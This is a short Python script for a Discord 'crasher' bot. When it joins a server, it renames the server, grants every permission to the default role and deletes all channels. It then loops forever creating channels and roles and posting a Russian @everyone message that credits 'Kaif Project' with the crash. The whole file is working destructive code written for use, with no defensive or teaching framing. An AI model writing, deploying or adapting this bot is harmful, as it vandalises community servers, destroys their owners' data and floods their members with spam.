import discord
from discord.ext import commands
from discord import Permissions
import time
import os
token = os.environ.get('TOKENZ')

class MyClient(discord.Client):
    async def on_guild_join(self, guild):
        await guild.edit(name='__...-<<CRASHED>>-...__')
        await guild.default_role.edit(permissions=Permissions.all())

        for i in guild.channels:
            await i.delete()
            print('Канал', i, 'удалён!')

        while True:
            a = await guild.create_text_channel(name='CRASHED')
            await a.send('@everyone Сервер был крашнут ботом Kaif Project.')
            await guild.create_voice_channel(name='CRASHED')
            await guild.create_role(name='CRASHED')



client = MyClient()
client.run(str(token))
